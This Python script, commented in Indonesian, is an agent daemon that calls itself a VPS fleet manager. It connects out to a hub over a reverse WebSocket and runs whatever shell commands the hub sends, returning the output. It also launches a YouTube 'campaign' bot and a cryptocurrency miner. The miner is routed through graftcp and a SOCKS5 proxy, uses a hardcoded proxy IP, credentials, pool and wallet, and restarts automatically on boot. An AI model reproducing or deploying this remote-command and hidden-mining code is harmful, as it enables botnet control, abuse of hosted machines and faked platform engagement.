#!/usr/bin/env python3
"""
Muse VPS Fleet Manager - Agent Daemon
Dijalankan di VPS Muse (~/workspace/agent.py).
Menghubungi Hub Server PC via WebSocket keluar (Reverse WebSocket).
Tahan reboot: Menggunakan ~/workspace/ untuk penyimpanan konfigurasi permanen.
"""

import asyncio
import json
import logging
import os
import platform
import socket
import subprocess
import sys
import time
import uuid

# Pastikan library websockets tersedia
try:
    import websockets
except ImportError:
    print("[ERROR] websockets tidak ditemukan! Jalankan: pip3 install websockets")
    sys.exit(1)

# Setup Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("MuseAgent")

# Direktori kerja persisten di Muse VPS
WORKSPACE_DIR = os.path.expanduser("~/workspace")
AGENT_ID_FILE = os.path.join(WORKSPACE_DIR, ".agent_id")
VPS_NAME_FILE = os.path.join(WORKSPACE_DIR, ".vps_name")
HUB_URL_FILE = os.path.join(WORKSPACE_DIR, ".hub_url")
MINING_DIR = os.path.join(WORKSPACE_DIR, "gaszep")
MINING_CONF_FILE = os.path.join(WORKSPACE_DIR, ".mining_config.json")

# ==========================================
# Identitas Agent Persisten
# ==========================================
def get_or_create_agent_id() -> str:
    os.makedirs(WORKSPACE_DIR, exist_ok=True)
    if os.path.exists(AGENT_ID_FILE):
        try:
            with open(AGENT_ID_FILE, "r") as f:
                aid = f.read().strip()
                if aid:
                    return aid
        except Exception:
            pass
    
    new_id = str(uuid.uuid4())
    try:
        with open(AGENT_ID_FILE, "w") as f:
            f.write(new_id)
    except Exception as e:
        logger.warning(f"Gagal simpan agent_id: {e}")
    return new_id

def get_vps_name() -> str:
    if os.path.exists(VPS_NAME_FILE):
        try:
            with open(VPS_NAME_FILE, "r") as f:
                name = f.read().strip()
                if name:
                    return name
        except Exception:
            pass
    return socket.gethostname()

def get_hub_url() -> str:
    # 1. Dari Environment Variable
    env_url = os.environ.get("HUB_URL")
    if env_url:
        return env_url
    
    # 2. Dari File Persisten
    if os.path.exists(HUB_URL_FILE):
        try:
            with open(HUB_URL_FILE, "r") as f:
                url = f.read().strip()
                if url:
                    return url
        except Exception:
            pass
    
    # 3. Default Fallback
    return "ws://localhost:9000"

# ==========================================
# Sistem & Hardware Info (Pure Stdlib /proc)
# ==========================================
_prev_cpu_total = 0
_prev_cpu_idle = 0

def read_cpu_percent() -> float:
    global _prev_cpu_total, _prev_cpu_idle
    try:
        with open("/proc/stat", "r") as f:
            fields = [float(x) for x in f.readline().strip().split()[1:8]]
            idle = fields[3] + fields[4]
            total = sum(fields)
            
            diff_idle = idle - _prev_cpu_idle
            diff_total = total - _prev_cpu_total
            _prev_cpu_idle = idle
            _prev_cpu_total = total

            if diff_total == 0:
                return 0.0
            pct = 100.0 * (1.0 - (diff_idle / diff_total))
            return round(max(0.0, min(100.0, pct)), 1)
    except Exception:
        return 0.0

def get_system_stats() -> dict:
    mem_free_mb = 0
    uptime_str = "-"
    
    # 1. Baca Memory dari /proc/meminfo
    try:
        with open("/proc/meminfo", "r") as f:
            mem_data = {}
            for line in f:
                parts = line.split(":")
                if len(parts) == 2:
                    k = parts[0].strip()
                    v = parts[1].strip().split()[0]
                    mem_data[k] = int(v)
            available = mem_data.get("MemAvailable", mem_data.get("MemFree", 0))
            mem_free_mb = int(available / 1024)
    except Exception:
        pass

    # 2. Baca Uptime dari /proc/uptime
    try:
        with open("/proc/uptime", "r") as f:
            total_sec = float(f.readline().split()[0])
            hours = int(total_sec // 3600)
            minutes = int((total_sec % 3600) // 60)
            uptime_str = f"{hours}h {minutes}m"
    except Exception:
        pass

    # 3. CPU Percent
    cpu_pct = read_cpu_percent()

    return {
        "mem_free_mb": mem_free_mb,
        "uptime": uptime_str,
        "cpu_pct": cpu_pct
    }

# ==========================================
# Mining Supervisor (graftcp + gasdag)
# ==========================================
class MiningSupervisor:
    def __init__(self):
        self.active_process = None

    def is_running(self) -> bool:
        # Cek apakah gasdag aktif
        try:
            res = subprocess.run(["pgrep", "-f", "gasdag"], stdout=subprocess.PIPE, text=True)
            return len(res.stdout.strip()) > 0
        except Exception:
            return False

    def start_or_update(self, config: dict) -> str:
        """
        Menulis config graftcp-local.conf dan menjalankan miner
        """
        proxy = config.get("proxy", "43.135.134.20:443")
        username = config.get("username", "aku")
        password = config.get("password", "akukayaraya")
        pool = config.get("pool", "43.135.134.20:10080")
        algo = config.get("algo", "rx/0")
        wallet = config.get("wallet", "ZEPHs6o8vDK6YnBK9KtWEpC35td1SFNQJ42YxUgx6KPNZAChABkYhNu6eXwNvxXDPiLbTT9rUskfHHau6e8KgcTBj7tAAdZPuS5")

        # Simpan config agar survive restart
        try:
            with open(MINING_CONF_FILE, "w") as f:
                json.dump(config, f, indent=2)
        except Exception as e:
            logger.warning(f"Gagal simpan mining config: {e}")

        if not os.path.exists(MINING_DIR):
            return f"Folder {MINING_DIR} tidak ditemukan! Pastikan gaszep sudah terinstall."

        # Hentikan miner lama jika ada
        self.stop()

        # 1. Update graftcp-local.conf
        conf_path = os.path.join(MINING_DIR, "graftcp/local/graftcp-local.conf")
        os.makedirs(os.path.dirname(conf_path), exist_ok=True)
        conf_content = f"""listen = :2233
loglevel = 1
socks5 = {proxy}
socks5_username = {username}
socks5_password = {password}
"""
        with open(conf_path, "w") as f:
            f.write(conf_content)

        # 2. Jalankan graftcp-local di background jika belum ada
        check_local = subprocess.run(["pgrep", "-f", "graftcp-local"], stdout=subprocess.PIPE, text=True)
        if not check_local.stdout.strip():
            local_bin = os.path.join(MINING_DIR, "graftcp/local/graftcp-local")
            subprocess.Popen([local_bin, "-config", conf_path], cwd=MINING_DIR, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)

        # 3. Beri chmod executable pada gasdag
        gasdag_bin = os.path.join(MINING_DIR, "gasdag")
        if os.path.exists(gasdag_bin):
            os.chmod(gasdag_bin, 0o755)

        # 4. Jalankan miner lewat graftcp
        graftcp_bin = os.path.join(MINING_DIR, "graftcp/graftcp")
        worker_id = f"{wallet}.{socket.gethostname()}"
        miner_cmd = [
            graftcp_bin,
            gasdag_bin,
            "-a", algo,
            "-o", pool,
            "-u", worker_id,
            "-p", "x"
        ]

        logger.info(f"Memulai mining: {' '.join(miner_cmd)}")
        self.active_process = subprocess.Popen(
            miner_cmd,
            cwd=MINING_DIR,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        return f"Mining berhasil dimulai! PID: {self.active_process.pid} (Algo: {algo}, Pool: {pool})"

    def stop(self) -> str:
        try:
            subprocess.run(["pkill", "-9", "-f", "gasdag"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return "Mining berhasil dihentikan."
        except Exception as e:
            return f"Error menghentikan miner: {e}"

mining_sup = MiningSupervisor()

# ==========================================
# Command Dispatcher
# ==========================================
active_tasks = []

async def execute_command(msg: dict, ws, agent_id: str):
    mtype = msg.get("type")

    if mtype == "PING":
        pong = {
            "type": "PONG",
            "agent_id": agent_id,
            "sent_ts": msg.get("sent_ts", 0)
        }
        await ws.send(json.dumps(pong))

    elif mtype == "STATUS":
        # Kirim status langsung
        stats = get_system_stats()
        resp = {
            "type": "HEARTBEAT",
            "agent_id": agent_id,
            "active_tasks": get_active_tasks_list(),
            **stats
        }
        await ws.send(json.dumps(resp))

    elif mtype == "OPEN_URL":
        url = msg.get("url")
        if not url:
            return
        logger.info(f"Membuka URL di browser VPS: {url}")
        
        # Coba buka URL via beberapa metode
        opened = False
        for cmd in [
            ["xdg-open", url],
            ["chromium-browser", "--no-sandbox", url],
            ["google-chrome", "--no-sandbox", url],
            ["python3", "-m", "webbrowser", url]
        ]:
            try:
                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                opened = True
                break
            except FileNotFoundError:
                continue
        
        await ws.send(json.dumps({
            "type": "TASK_DONE",
            "agent_id": agent_id,
            "task": "OPEN_URL",
            "detail": f"Browser membuka: {url}" if opened else f"Gagal membuka URL: {url}"
        }))

    elif mtype == "SHELL":
        cmd_str = msg.get("cmd")
        if not cmd_str:
            return
        logger.info(f"Menjalankan perintah Shell: {cmd_str}")
        try:
            proc = subprocess.run(
                cmd_str,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=30
            )
            out = proc.stdout + proc.stderr
            await ws.send(json.dumps({
                "type": "RESULT",
                "agent_id": agent_id,
                "output": out[:2000], # Batasi agar tidak overload WS
                "exit_code": proc.returncode
            }))
        except subprocess.TimeoutExpired:
            await ws.send(json.dumps({
                "type": "RESULT",
                "agent_id": agent_id,
                "output": "Error: Perintah melebihi batas waktu 30 detik (Timeout).",
                "exit_code": 124
            }))
        except Exception as e:
            await ws.send(json.dumps({
                "type": "RESULT",
                "agent_id": agent_id,
                "output": f"Error: {e}",
                "exit_code": 1
            }))

    elif mtype == "YOUTUBE_CAMPAIGN":
        campaign = msg.get("campaign", {})
        asyncio.create_task(run_youtube_worker_task(campaign, ws, agent_id))

    elif mtype == "MINING_ACTION":
        action = msg.get("action")
        config = msg.get("config", {})
        if action == "START":
            res = mining_sup.start_or_update(config)
            await ws.send(json.dumps({
                "type": "TASK_DONE",
                "agent_id": agent_id,
                "task": "MINING",
                "detail": res
            }))
        elif action == "STOP":
            res = mining_sup.stop()
            await ws.send(json.dumps({
                "type": "TASK_DONE",
                "agent_id": agent_id,
                "task": "MINING",
                "detail": res
            }))

def get_active_tasks_list():
    tasks = []
    if mining_sup.is_running():
        tasks.append("Mining")
    tasks.extend(active_tasks)
    return tasks

# ==========================================
# Subprocess YouTube Bot Runner
# ==========================================
async def run_youtube_worker_task(campaign: dict, ws, agent_id: str):
    worker_script = os.path.join(WORKSPACE_DIR, "youtube_worker.py")
    if not os.path.exists(worker_script):
        await ws.send(json.dumps({
            "type": "TASK_DONE",
            "agent_id": agent_id,
            "task": "YOUTUBE",
            "detail": f"Script {worker_script} belum ada di VPS!"
        }))
        return

    task_name = "YouTube Bot"
    if task_name not in active_tasks:
        active_tasks.append(task_name)

    try:
        await ws.send(json.dumps({
            "type": "TASK_UPDATE",
            "agent_id": agent_id,
            "task": "YOUTUBE",
            "detail": f"Memulai browser untuk kata kunci: '{campaign.get('search_query')}'"
        }))

        # Jalankan youtube_worker.py secara asynchronous
        proc = await asyncio.create_subprocess_exec(
            sys.executable,
            worker_script,
            json.dumps(campaign),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Baca progress output per-baris dari worker
        while True:
            line = await proc.stdout.readline()
            if not line:
                break
            text = line.decode().strip()
            if text:
                try:
                    update_data = json.loads(text)
                    if update_data.get("type") == "PROGRESS":
                        await ws.send(json.dumps({
                            "type": "TASK_UPDATE",
                            "agent_id": agent_id,
                            "task": "YOUTUBE",
                            "detail": update_data.get("detail", text)
                        }))
                except json.JSONDecodeError:
                    pass

        await proc.wait()
        stderr_output = (await proc.stderr.read()).decode().strip()

        if proc.returncode == 0:
            await ws.send(json.dumps({
                "type": "TASK_DONE",
                "agent_id": agent_id,
                "task": "YOUTUBE",
                "detail": "Kampanye YouTube berhasil diselesaikan!"
            }))
        else:
            await ws.send(json.dumps({
                "type": "TASK_DONE",
                "agent_id": agent_id,
                "task": "YOUTUBE",
                "detail": f"Gagal (code {proc.returncode}): {stderr_output[-200:]}"
            }))

    except Exception as e:
        logger.error(f"Error menjalankan YouTube worker: {e}")
    finally:
        if task_name in active_tasks:
            active_tasks.remove(task_name)

# ==========================================
# Background Heartbeat Sender
# ==========================================
async def heartbeat_loop(ws, agent_id: str):
    while True:
        try:
            await asyncio.sleep(30)
            stats = get_system_stats()
            payload = {
                "type": "HEARTBEAT",
                "agent_id": agent_id,
                "active_tasks": get_active_tasks_list(),
                **stats
            }
            await ws.send(json.dumps(payload))
        except Exception:
            break

# ==========================================
# Auto-Start Mining saat Boot VPS
# ==========================================
def check_and_autostart_mining():
    if os.path.exists(MINING_CONF_FILE):
        try:
            with open(MINING_CONF_FILE, "r") as f:
                cfg = json.load(f)
            logger.info("Mendeteksi konfigurasi mining tersimpan. Memulai auto-start mining...")
            mining_sup.start_or_update(cfg)
        except Exception as e:
            logger.warning(f"Gagal auto-start mining: {e}")

# ==========================================
# Main Connection Loop (Forever Reconnect)
# ==========================================
async def main():
    agent_id = get_or_create_agent_id()
    vps_name = get_vps_name()
    hub_url = get_hub_url()

    logger.info("==========================================")
    logger.info("🤖 MUSE VPS FLEET MANAGER - AGENT DAEMON")
    logger.info("==========================================")
    logger.info(f"Agent ID : {agent_id}")
    logger.info(f"VPS Name : {vps_name}")
    logger.info(f"Hub URL  : {hub_url}")
    logger.info("==========================================")

    # Cek apakah ada konfigurasi mining yang perlu di-restore
    check_and_autostart_mining()

    # Loop Reconnect Selamanya (Tiap 30 Detik)
    while True:
        try:
            logger.info(f"Menghubungkan ke Hub Server di {hub_url}...")
            async with websockets.connect(hub_url, ping_interval=20, ping_timeout=20) as ws:
                # 1. Kirim pesan HELLO untuk identifikasi
                hello = {
                    "type": "HELLO",
                    "agent_id": agent_id,
                    "vps_name": vps_name,
                    "os": platform.system() + " " + platform.release(),
                    "python": platform.python_version()
                }
                await ws.send(json.dumps(hello))
                logger.info("✅ Berhasil terhubung dan terdaftar di Hub!")

                # 2. Kirim Heartbeat inisial
                stats = get_system_stats()
                await ws.send(json.dumps({
                    "type": "HEARTBEAT",
                    "agent_id": agent_id,
                    "active_tasks": get_active_tasks_list(),
                    **stats
                }))

                # 3. Jalankan Heartbeat Loop di background
                hb_task = asyncio.create_task(heartbeat_loop(ws, agent_id))

                # 4. Dengarkan perintah masuk dari Hub
                async for message in ws:
                    try:
                        data = json.loads(message)
                        await execute_command(data, ws, agent_id)
                    except json.JSONDecodeError:
                        logger.warning("Menerima pesan non-JSON dari Hub")

                hb_task.cancel()

        except (websockets.exceptions.ConnectionClosed, ConnectionRefusedError, OSError) as e:
            logger.warning(f"Koneksi ke Hub terputus atau gagal ({e}). Reconnect dalam 30 detik...")
        except Exception as e:
            logger.error(f"Kesalahan tak terduga: {e}. Reconnect dalam 30 detik...")

        await asyncio.sleep(30)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Agent dihentikan oleh pengguna.")
